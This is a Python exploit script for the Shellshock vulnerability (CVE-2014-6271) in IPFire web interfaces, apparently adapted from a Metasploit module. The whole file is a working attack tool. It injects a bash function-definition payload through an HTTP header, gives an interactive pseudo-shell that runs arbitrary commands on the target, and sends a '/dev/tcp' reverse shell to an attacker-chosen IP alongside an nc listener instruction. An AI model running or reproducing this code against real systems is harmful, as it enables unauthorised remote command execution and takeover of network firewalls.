#!/usr/bin/python3
#IP Fire (<=2.15) ShellShock RCE
#CVE-2014-6271
#Based on Metasploit Module (EDB ID: 34839)
#AG | MuirlandOracle
#11/20

#### Imports ####
import argparse, requests, sys, signal, ssl, socket, random, string, re, socket
from urllib3.exceptions import InsecureRequestWarning


#### Ignore insecure SSL Cert warnings ####
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)


#### Globals ####
class colours():
	red = "\033[91m"
	green = "\033[92m"
	blue = "\033[34m"
	orange = "\033[33m"
	purple = "\033[35m"
	end = "\033[0m"


banner = (f"""{colours.orange}


	 ___ ____  _____ _            ____   ____ _____ 
	|_ _|  _ \|  ___(_)_ __ ___  |  _ \ / ___| ____|
	 | || |_) | |_  | | '__/ _ \ | |_) | |   |  _|  
	 | ||  __/|  _| | | | |  __/ |  _ <| |___| |___ 
	|___|_|   |_|   |_|_|  \___| |_| \_\\____|_____|
                                                
					{colours.purple}@MuirlandOracle{colours.end}


""")



#### Signal Handler ####
def sigHandler(sig, frame):
	print(f"{colours.blue}\n[*] Exiting....{colours.end}\n")
	sys.exit(0);



#### Exploit ####
class Exploit():
	def __init__(self):
		self.session = requests.Session()
		self.session.verify = False

	#### Colour Helpers ####
	def fail(self, reason, die=True):
		if not self.args.accessible:
			print(f"{colours.red}[-] {reason}{colours.end}")
		else:
			print(f"Failure: {reason}")
		if die:
			sys.exit(0)

	def success(self, text):
		if not self.args.accessible:
			print(f"{colours.green}[+] {text}{colours.end}")
		else:
			print(f"Success: {text}")

	def warn(self, text):
		if not self.args.accessible:
			print(f"{colours.orange}[*] {text}{colours.end}")
		else:
			print(f"Warning: {text}")

	def info(self, text):
		if not self.args.accessible:
			print(f"{colours.blue}[*] {text}{colours.end}")
		else:
			print(f"Info: {text}")


	#### ArgParsing ####
	def parseArgs(self):
		parser = argparse.ArgumentParser(description="CVE-2014-6271 IP Fire Shellshock (<=2.14) Exploit")
		parser.add_argument("target", help="The target IP or domain")
		parser.add_argument("-u", "--username", help="Username to bypass http basic auth")
		parser.add_argument("-p", "--password", help="Password to bypass http basic auth")
		parser.add_argument("-s", "--ssl", help="Specify to use SSL", default="http://", const="https://", action="store_const")
		parser.add_argument("--accessible", default=False, action="store_true", help="Put exploit in accessibility mode")
		parser.add_argument("-P", "--port", help="Specify an abnormal port (default: 81 for HTTP or 444 for HTTPS")
		args = parser.parse_args()

		#Validate port
		if not args.port:
			if "https" in args.ssl:
				args.port = 444
			else:
				args.port = 81
		elif args.port not in range(1,65535):
			self.fail(f"Invalid Port: {args.port}")
		
		#Validate creds
		if (args.password and not args.username) or (args.username and not args.password):
			parser.error("Both username and password must be specified if using Basic Auth")

		self.args = args
		self.target = f"{self.args.ssl}{self.args.target}:{self.args.port}/cgi-bin/index.cgi"
		
	#### Checks ####
	def connect(self):
		try:
			if self.args.username:
				r = self.session.get(self.target, auth=(self.args.username, self.args.password), timeout=3)
			else:
				r = self.session.get(self.target, timeout=3)
		except:
			self.fail("Request timed out")
		if r.status_code != 200:
			self.fail("Failed to connect to the target. Ensure that your credentials are correct, and that SSL is being used if necessary")
		else:
			self.success("Confirmed Authentication with the target")

		#Check Version
		version = re.findall("IPFire \d\.\d+", str(r.content))
		if len(version) == 0:
			self.fail("Failed to find the version of the target")

		version = version[0].split(" ")[1]
		if float(version) <= 2.15:
			self.success(f"Version ({version}) is vulnerable!")
		else:
			self.fail(f"Version ({version}) is not vulnerable")

		


	def benign(self):
		testString = "".join(random.choices(string.ascii_letters + string.digits, k=8))
		exploitResult = self.exploitVuln(f"echo {testString}")
		if testString in exploitResult:
			self.success("Benign payload successfully executed!")
		else:
			self.fail("Failed to execute benign command")


	#### Exploit ####
	def exploitVuln(self, cmd):
		command = {"VULN":"() { :;}; /bin/bash -c \" echo SPLIT; " + cmd + " 2>&1; echo SPLIT\";"}
		try:
			if self.args.username:
				r = self.session.get(self.target, auth=(self.args.username, self.args.password), headers=command, timeout=3)
			else:
				r = self.session.get(self.target, headers=command, timeout=3)
		except:
			self.warn("Request timed out")
			return
		if "SPLIT" in r.content.decode():
			return (r.content.decode().split("SPLIT")[1].strip())
		else:
			return "Error: Something went wrong"

	def pseudoShell(self):
		username = self.exploitVuln("whoami")
		hostname = self.exploitVuln("hostname")
		print()
		self.success("The target is vulnerable and a pseudoshell has been obtained.\n"
					"Type commands to have them executed on the target.")
		self.info("Type 'exit' to exit.")
		self.info("Type 'shell' to obtain a reverse shell.")
		print()
		self.info(f"Username is: {username}")
		self.info(f"Hostname is: {hostname}")
		prompt = "# " if (username == "root") else "$ "
		while True:
			command = input(prompt)
			if command.lower() == "quit" or command.lower() == "exit":
				self.info("Exiting....\n")
				sys.exit(0)
			elif command.lower() == "shell":
				self.shell()
			elif len(command) == 0:
				continue
			else:
				result = self.exploitVuln(command)
				print(result)	

	def shell(self):
		print()
		self.info("Starting the reverse shell process")
		self.warn("Use 'exit' to return to the pseudoshell at any time")
		#Get IP
		while True:
			ip = input("Please enter your IP address to receive the shell on: ")
			if ip.lower() == "exit":
				return
			try:
				socket.inet_aton(ip)
			except socket.error:
				self.fail("Invalid IP address\n", False)
				continue
			break

		#Get Port
		while True:
			port = input("Please enter the port number for the shell: ")
			if port.lower() == "exit":
				return
			try:
				port = int(port)
				assert(port < 65535 and port >= 1)
			except:
				self.fail("Invalid port number\n", False)
				continue
			break
		
		#Shellcode
		shellcode = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"

		print()
		sudoCheck = lambda: "sudo " if (port < 1024) else ""
		self.warn(f"Start a netcat listener in a new window ({sudoCheck()}nc -lvnp {port}) then press enter.")
		input()
		self.exploitVuln(shellcode)
		self.success("You should now have a reverse shell on the target")
		self.warn("If this is not the case, please check your IP and chosen port\nIf these are correct then the firewall is likely preventing the reverse connection, Try choosing a well-known port such as 443 or 53")



if __name__ == "__main__":
	signal.signal(signal.SIGINT, sigHandler)
	exploit = Exploit()
	exploit.parseArgs()
	if not exploit.args.accessible:
		print(banner)
	else:
		print("IPFire RCE (Shellshock), coded by @MuirlandOracle")
	exploit.connect()
	exploit.benign()
	exploit.pseudoShell()
